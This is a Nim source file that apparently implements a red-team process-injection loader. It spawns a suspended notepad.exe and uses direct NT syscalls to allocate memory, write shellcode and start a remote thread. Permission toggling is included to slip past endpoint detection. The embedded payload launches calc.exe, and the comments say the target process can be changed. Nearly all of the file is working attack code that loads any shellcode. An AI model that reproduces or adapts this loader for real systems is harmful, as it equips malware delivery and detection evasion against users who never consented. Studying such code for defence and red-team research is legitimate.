#[
    Author: 0x42en
    License: BSD 3-Clause

    This file require winim external lib to be installed
        nimble install winim

    Compile it on linux using:
        nim c -d=release -d=danger -d=strip --opt=size -d=mingw --app=console --cpu=amd64 --out=app.exe inject.nim
]#

import os
import osproc
import winim/lean

# Ensure syscall.nim is generated next to this file
import syscall

proc execute(name: string, shellcode: openarray[byte]): void =
    var 
        op: DWORD
        oa: OBJECT_ATTRIBUTES
        cid: CLIENT_ID
        rPtr: LPVOID
        pHandle: HANDLE
        tHandle: HANDLE
        bytesWritten: SIZE_T
        shellLen: SIZE_T = sizeof(shellcode)

    # Create sacrificial process
    let tProcess = startProcess(name)
    tProcess.suspend()
    defer: tProcess.close()

    # Generate Object
    InitializeObjectAttributes(addr oa, NULL, 0, 0, NULL)
    cid.UniqueProcess = tProcess.processID

    # Open sacrificial process
    NtOpenProcess(addr pHandle, PROCESS_ALL_ACCESS, addr oa, addr cid)
    defer: CloseHandle(pHandle)

    # Allocate memory page to sacrifical process
    NtAllocateVirtualMemory(
        pHandle,
        addr rPtr,
        0,
        addr shellLen,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READ_WRITE
    )

    # Write shellcode to memory page
    NtWriteVirtualMemory(pHandle, rPtr, unsafeAddr shellcode, shellLen, addr bytesWritten)
    # Change back memory page permissions
    NtProtectVirtualMemory(pHandle, rPtr, addr shellLen, PAGE_NOACCESS, addr op)

    # Wait a bit...
    sleep(1000)
    
    # Create main thread of sacrificial process
    NtCreateThreadEx(
        addr tHandle,
        THREAD_ALL_ACCESS,
        NULL,
        pHandle,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, false, 0, 0, 0, NULL)
    # Protect memory page with Execute permission
    NtProtectVirtualMemory(pHandle, rPtr, addr shellLen, PAGE_EXECUTE, addr op)
    # Start main thread
    ResumeThread(tHandle)

# shellcode generated with ShellSnip (launch calc.exe)
var shellcode = @[ byte 0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,
0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,
0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,
0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,
0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,0x4d,0x31,0xdb,0x44,
0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,
0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,0x0c,
0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,
0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,
0x8b,0x04,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,
0xb8,0xff,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xc1,0xe8,0x08,0x48,0xf7,
0xd0,0x50,0x51,0xe8,0xb0,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc0,0x50,
0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,
0x31,0xd2,0x48,0xff,0xc2,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0x41,0xff,0xd6,
0x48,0x83,0xc4,0x20,0xc3]

# This is essentially the equivalent of 'if __name__ == '__main__' in python
when isMainModule:
    # You might want to change sacrificial process name
    execute("notepad.exe", shellcode)